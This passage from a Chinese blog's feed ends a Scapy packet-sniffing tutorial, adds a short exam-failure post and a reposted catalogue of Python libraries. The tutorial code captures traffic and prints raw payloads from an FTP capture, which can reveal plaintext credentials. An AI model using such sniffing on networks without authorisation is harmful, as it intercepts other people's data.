结束监听。</span></span><br><span class="line"><span class="string">4. sniff也支持无线网卡的监听模式。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h6 id="抓包、分析包"><a href="#抓包、分析包" class="headerlink" title="抓包、分析包"></a>抓包、分析包</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">prn指向一个回调函数，意为将收到的包丢给prn指向的函数处理（注意：回调的意义！每收到一个包就丢到回调函数里执行一下，执行完了才再跑回来继续抓包）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">filter为包过滤规则（语法参照tcpdump过滤规则）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">store为是否要存储抓到的包（注意，如果没有存储则不会将抓到的包赋值给a，因为没有存下就没有东西可以赋，此参数默认开启）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">timeout为抓包时长，比如抓30秒就结束（注意：如果没有指定抓包时长则会一直抓下去，程序会一直卡在这里）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">iface为指定抓包的网卡</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">a = sniff(prn=abc, filter=<span class="string">'tcp port 80 and ip 192.168.1.1'</span>, store=<span class="number">1</span>, timeout=<span class="number">30</span>, iface=<span class="string">'eth0'</span>)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 此函数可以将抓到的包存到本地（注意：将包写入本地不能使用open（'packet.cap', 'r'）,因为open函数只能写入字符串）。</span></span><br><span class="line">wrpcap(<span class="string">'packet.cap'</span>, a)    </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 此函数可以将本地存储的数据包读取出来</span></span><br><span class="line">bbb = rdpcap(<span class="string">'/root/Desktop/ftp.cap'</span>) </span><br><span class="line"><span class="comment"># 读取出来的对象是由N个数据包组成的可迭代对象，每次迭代一个包</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bbb:</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="comment"># 输出数据包的应用层负载</span></span><br><span class="line">        print(i.getlayer(<span class="string">'Raw'</span>).fields[<span class="string">'load'</span>].decode().strip())   </span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>先简单了解一下，剩下的后面慢慢学</p><blockquote><p>更多用法见官方文档：<a href="https://scapy.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      scapy -- 网络编程之利器
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="Scapy" scheme="http://www.xpshuai.cn/tags/Scapy/"/>
    
  </entry>
  
  <entry>
    <title>这一天，我考研失败</title>
    <link href="http://www.xpshuai.cn/%E8%BF%99%E4%B8%80%E5%A4%A9%EF%BC%8C%E6%88%91%E8%80%83%E7%A0%94%E5%A4%B1%E8%B4%A5/"/>
    <id>http://www.xpshuai.cn/这一天，我考研失败/</id>
    <published>2020-02-20T05:21:42.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="考研" scheme="http://www.xpshuai.cn/categories/%E8%80%83%E7%A0%94/"/>
    
    
      <category term="考研" scheme="http://www.xpshuai.cn/tags/%E8%80%83%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>python-常用库</title>
    <link href="http://www.xpshuai.cn/python-%E5%B8%B8%E7%94%A8%E5%BA%93/"/>
    <id>http://www.xpshuai.cn/python-常用库/</id>
    <published>2020-02-19T13:01:27.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转载自：<a href="https://www.jianshu.com/p/d25a9169fe86" target="_blank" rel="noopener">https://www.jianshu.com/p/d25a9169fe86</a></p></blockquote><p>哈哈哈，我见大佬把这么多库都整理出来了，赶紧转载一下，太厉害啦。</p><p>库名称        简介</p><p>Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。</p><p>colorama 主要用来给文本添加各种颜色，并且非常简单易用。</p><p>Prettytable 主要用于在终端或浏览器端构建格式化的输出。</p><p>difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。</p><p>fuzzywuzzy 字符串模糊匹配。</p><p>esmre 正则表达式的加速器。</p><p>shortuuid 一组简洁URL/UUID函数库。</p><p>ftfy，Unicode文本工具7</p><p>unidecode，ascii和Unicode文本转换函数。</p><p>xpinyin，将汉字转换为拼音的函数库</p><p>pangu.py，调整对中日韩文字当中的字母、数字间距。</p><p>pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片</p><p>uniout，提取字符串中可读写的字符</p><p>awesome slugify，一个Python slugify库，用于处理Unicode。</p><p>python-slugify，转换Unicode为ASCII内码的slugify函数库。</p><p>unicode-slugify，生成unicode内码，Django的依赖包。</p><p>ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。</p><p>python-user-agents，浏览器的用户代理（user-agents）的解析器。</p><p>sqlparse，SQL解析器。</p><p>pygments，一个通用的语法高亮工具。</p><p>python-nameparser，解析人名，分解为单独的成分。</p><p>pyparsing，通用解析器生成框架。</p><p>tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。</p><p>python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。</p><p>xlwt/xlrd，读写Excel格式的数据文件。</p><p>xlsxwriter，创建Excel格式的xlsx文件。</p><p>xlwings，利用Python调用Excelcsvkit，CSV文件工具包。</p><p>marmir，把Python[数据结构]，转化为电子表格。</p><p>pdfminer，从PDF文件中提取信息。</p><p>pypdf2， 合并和转换PDF页面的函数库。</p><p>Python-Markdown，轻量级标记语言Markdown的Python实现。</p><p>Mistune，,快速、全功能的纯Python编写的Markdown解释器。</p><p>dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成</p><p>datetime，而rrule是则是根据定义的规则来生成datetime。</p><p>arrow,更好的日期和时间处理Python库</p><p>chronyk，一个Python 3版函数库，用于解析人写的时间和日期。</p><p>delorean，清理期时间的函数库。</p><p>when.py，为见的日期和时间，提供人性化的功能。</p><p>moment，类似Moment.js的日期/时间Python库</p><p>pytz，世界时区，使用tz database时区信息[数据库]</p><p>BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。</p><p>lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。</p><p>htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。</p><p>pyyaml，Python版本的YAML解释器。</p><p>html5lib，-标准库，解析和序列化HTML文档和片段。</p><p>pyquery，类似[jQuery]的的HTML解释器函数库。</p><p>cssutils，Python CSS库。</p><p>MarkupSafe，XML或HTML / XHTML安全字符串标记工具。</p><p>cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。</p><p>xmltodict，类似JSON的XML工具包。</p><p>xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。</p><p>untangle，把XML文档，转换为Python对象，方便访问。</p><p>文件处理</p><p>库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。</p><p>imghdr，Python标准库，确定图像类型。</p><p>python-magic，libmagic文件类型识别库，Python接口格式。</p><p>path.py，os.path模块的二次封装。</p><p>watchdog，一组API和shell实用程序，用于监视文件系统事件。</p><p>Unipath，面向对象的文件/目录的操作工具包。</p><p>pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p><p>cPickle是[C语言]实现的版本，速度更快。</p><p>ConfigParser，Python标准库，INI文件解析器。</p><p>configobj，INI文件解析器。</p><p>config，分层次配置，logging作者编写。</p><p>profig，多格式配置转换工具。</p><p>logging，Python标准库，日志文件生成管理函数库。</p><p>logbook，logging的替换品。</p><p>Sentry，实时log服务器。</p><p>Raven，哨兵Sentry的Python客户端。</p><p>Sphinx，斯芬克斯（狮身人面像），Python文档生成器。</p><p>reStructuredText，标记语法和解析工具，Docutils组件。</p><p>mkdocs，Markdown格式文档生成器。</p><p>pycco，简单快速、编程风格的文档生成器。</p><p>pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具</p><p>图像处理</p><p>库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。</p><p>Pillow，图像处理库，PIL图像库的分支和升级替代产品。</p><p>Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。</p><p>brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。</p><p>PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。</p><p>Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。</p><p>Pymunk，类似box2d的开源物理图形模拟库。</p><p>OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。</p><p>SimpleCV，计算机视觉开源框架，类似opencv。</p><p>VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。</p><p>cgkit,Python Computer Graphics Kit,其module 主要分两个部分</p><p>\1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用;</p><p>\2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。</p><p>CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。</p><p>Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。</p><p>Pycairo,开源矢量绘图库</p><p>Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。</p><p>wand，Python绑定魔杖工具（MagickWand），C语言API接口。</p><p>thumbor， -智能成像工具，可调整大小和翻转图像。</p><p>imgSeek，查询相似的图像。</p><p>python-qrcode，纯Python的二维码（QR码）生成器。</p><p>pyBarcode，创建条码，无需PIL模块。</p><p>pygram，Instagram像图像过滤器。</p><p>Quads，基于四叉树的计算机艺术。</p><p>nude.py，裸体检测函数。</p><p>scikit-image，scikit工具箱的图像处理库。</p><p>hmap，图像直方图工具。</p><p>bokeh，交互的Web绘图。</p><p>plotly，Web协同的Python和Matplotlib绘制。</p><p>vincent，文森特，Python Vega的函数库。</p><p>d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。</p><p>pygal， SVG图表的创造者。</p><p>pygraphviz，Graphviz的Python接口。</p><p>Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。</p><p>游戏和多媒体</p><p>库名称简介audiolazy，数字信号处理（DSP）的Python工具包。</p><p>audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。</p><p>beets，音乐库管理。dejavu，音频指纹识别算法。</p><p>Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。</p><p>django-elastic-transcoder,Django +亚马逊elastic转码。</p><p>eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。</p><p>id3reader，用于读取MP3的元数据。</p><p>mutagen，处理音频元数据。</p><p>pydub，-操纵音频和简单的高层次的接口。</p><p>pyechonest，Echo Nest API客户端。</p><p>talkbox，语音和信号处理的Python库。</p><p>TimeSide，开放的网络音频处理框架。</p><p>tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。</p><p>m3u8，用于解析m3u8文件。</p><p>moviepy，多格式视频编辑脚本模块，包括GIF动画。</p><p>shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。</p><p>GeoDjango,一个世界级的地理Web框架。</p><p>geopy,Geo地理编码的工具箱。</p><p>pygeoip，纯Python写的GeoIP API。</p><p>GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。</p><p>geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。</p><p>Pygame，Python游戏设计模块。</p><p>Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。</p><p>Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。</p><p>PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。</p><p>PyOpenGL，绑定OpenGL和它相关的API。</p><p>PySFML，Python绑定SFMLRenPy，视觉小说引擎。</p><p>大数据与科学计算</p><p>库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。</p><p>Open Mining，商业智能（BI），Pandas的Web界面。</p><p>blaze，NumPy和Pandas大数据界面。</p><p>SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。</p><p>ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。</p><p>NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。</p><p>Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。</p><p>Numba，科学计算速度优化编译器。</p><p>pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NetworkX，复杂网络的优化软件包。</p><p>zipline，交易算法的函数库。</p><p>PyDy， Python动态建模函数库。</p><p>SymPy,符号数学的Python库。</p><p>statsmodels,Python的统计建模和计量经济学。</p><p>astropy,天文学界的Python库。</p><p>orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。</p><p>Open Babel，巴贝尔，开放的化学工具箱。</p><p>cclib，化学软件包的计算函数库。</p><p>Biopython，免费的生物计算工具包。</p><p>bccb，生物分析相关的代码集。</p><p>bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。</p><p>visvis, 可视化计算模块库，可进行一维到四维数据的可视化。</p><p>MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。</p><p>Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。</p><p>luigi，为批量工作，建立复杂的管道。</p><p>mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。</p><p>人工智能与机器学习</p><p>库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。</p><p>Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。</p><p>textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。</p><p>jieba，结巴，中文分词工具。</p><p>snownlp，用于处理中文文本库。</p><p>loso，中文分词函数库。</p><p>genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。</p><p>Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。</p><p>scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。</p><p>PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。</p><p>Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。</p><p>Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。</p><p>PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。</p><p>Pylearn2，-基于Theano的机器学习库。</p><p>hebel，GPU加速，[深度学习]Python库。</p><p>gensim，机器学习库。</p><p>pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。</p><p>Crab，灵活的，快速的推荐引擎。</p><p>python-recsys，娱乐系统分析，推荐系统。</p><p>vowpal_porpoise，Vowpal Wabbit轻量级Python封装。</p><p>Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。</p><p>系统与命令行</p><p>库名称简介threading，Python标准线程库，更高级别的线程接口。</p><p>envoy，特使，Python子线程的函数库。</p><p>sh，成熟的子线程替换函数库。</p><p>sarge，封装线程。</p><p>subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。</p><p>eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。</p><p>pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。</p><p>pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息.</p><p>cement，一个轻量级的、功能齐全的命令行工具</p><p>click，简单优雅的的命令行接口。</p><p>clint，Python命令行工具。</p><p>cliff，创造多层次指令的命令行程序框架。</p><p>Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。</p><p>docopt，Python命令行参数分析器。</p><p>pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。</p><p>Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。</p><p>rainbowstream，聪明和漂亮的推特客户终端。</p><p>Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。</p><p>peewee，小型的ORM解析器。</p><p>PonyORM，为ORM提供了一种面向SQL的接口。</p><p>MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。</p><p>django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。</p><p>butterdb，谷歌电子表格的ORM，Python版。</p><p>celery，芹菜，异步任务队列/工作，基于分布式消息队列。</p><p>huey，休伊，轻量级，多线程任务队列。</p><p>mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。</p><p>rq，简单的工作队列。</p><p>Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。</p><p>simpleq，简单的，可扩展的队列，Amazon SQS基础队列。</p><p>Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。</p><p>funcy，函数编程工具。</p><p>Toolz，函数编程工具：迭代器、函数，字典。</p><p>CyToolz，Toolz的Cython实现，高性能的函数编程工具。</p><p>Ansible，安塞波，极为简单的自动化平台。</p><p>SaltStack，基础设施的自动化管理系统。</p><p>Fabric，织物，一个简单，远程执行和部署的语言工具。</p><p>Fabtools，Fabric的工具函数。</p><p>cuisine，热门的Fabric的工具函数。</p><p>psutil，跨平台的过程和系统工具模块。</p><p>pexpect，控制互动节目。</p><p>provy，易于使用的配置系统的Python。</p><p>honcho，Foreman的Python接口，用于管理procfile应用工具。</p><p>gunnery，多任务执行工具，与网络接口的分布式系统。</p><p>fig，快速。独立的开发环境中使用泊坞窗。</p><p>APScheduler，轻量级、但功能强大的在线任务调度程序。</p><p>django-schedule,Django日程应用程序。</p><p>doit,任务流道/生成工具。</p><p>Joblib,Python提供的轻量级的流水线工具函数。</p><p>Plan，简易生成crontab文件。</p><p>Spiff，纯Python实现的，功能强大的工作流引擎。</p><p>schedule，Python作业调度。</p><p>TaskFlow，有助于使任务执行简单。</p><p>ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。</p><p>cffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。</p><p>Cytoolz，python 加速库SWIG，简化封装和接口生成器。</p><p>Cython，Python优化静态编译器。</p><p>PyPy，Python解释器的 Python实现。</p><p>Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。</p><p>pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。</p><p>ino，Arduino命令行工具。</p><p>Pyro，Python的机器人工具包。</p><p>pluginbase，一个简单而灵活的Python的插件系统。</p><p>itsdangerous，数据安全传输工具。</p><p>blinker，快速Python中的信号/事件调度系统。</p><p>pychievements，用于创建和跟踪成果框架。</p><p>python-patterns，Python中的设计模式。</p><p>pefileWindows PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。</p><p>数据库</p><p>库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。</p><p>pickledb,简单和轻量级的K-V键值存储。</p><p>TinyDB, 轻量级，面向文档的数据库。</p><p>mysql-python，MySQL的Python工具库。</p><p>mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。</p><p>mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。</p><p>oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。</p><p>psycopg2，最流行的Python PostgreSQL适配器。</p><p>txpostgres，于Twisted的异步驱动，用于PostgreSQL。</p><p>queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。</p><p>cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。</p><p>HappyBase，友好的Apache [Hbase]的函数库。</p><p>PyMongo，MongoDB官方客户端。</p><p>Plyvel，LevelDB快速和功能丰富的Python接口。</p><p>redis-py,redis客户端。</p><p>py2neo,Python客户端(基于Neo4j的RESTful接口).</p><p>telephus,基于Twisted的cassandra客户端。</p><p>txRedis，基于Twisted的Redis客户端。</p><p>在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！</p><p>【网络】</p><p>Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。</p><p>Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。</p><p>httpie，命令行HTTP客户端，用户友好的cURL的替换工具。</p><p>s3cmd，命令行工具，用于管理Amazon S3和CloudFront。</p><p>youtube-dl，命令行程序，从YouTube下载视频。</p><p>you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。</p><p>subliminal，命令行工具，搜索和下载字幕的函数库。</p><p>requests，HTTP函数库，更加人性化。</p><p>grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。</p><p>urllib3，一个线程安全的HTTP连接池，支持文件post。</p><p>httplib2，综合HTTP的客户端函数库。</p><p>treq， Python API接口，Twisted的HTTP客户。</p><p>Mininet，流行的网络仿真器,API采用python编写。</p><p>POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。</p><p>Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。</p><p>SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。</p><p>inbox.py，Python的SMTP服务器。</p><p>imbox， Python版本IMAP库。</p><p>inbox，收件箱，开源邮件工具包。</p><p>lamson,SMTP服务器。</p><p>flanker,侧卫,电子邮件地址和MIME解析库。</p><p>marrow.mailer,高性能可扩展邮件交付框架。</p><p>django-celery-ses， 